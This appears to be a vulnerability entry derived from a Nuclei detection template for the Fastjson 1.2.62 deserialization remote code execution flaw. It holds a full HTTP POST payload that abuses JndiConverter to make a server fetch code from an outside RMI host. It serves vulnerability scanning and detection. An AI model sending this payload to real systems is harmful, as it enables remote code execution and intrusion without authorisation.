# Vulnerability: Fastjson 1.2.62 - Remote Code Execution
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`fastjson-1-2-62-rce.yaml`)

## Description
Fastjson 1.2.62 is susceptible to a deserialization remote code execution vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{
   "@type":"org.apache.xbean.propertyeditor.JndiConverter",
   "AsText":"rmi://{{interactsh-url}}/exploit"
}
```

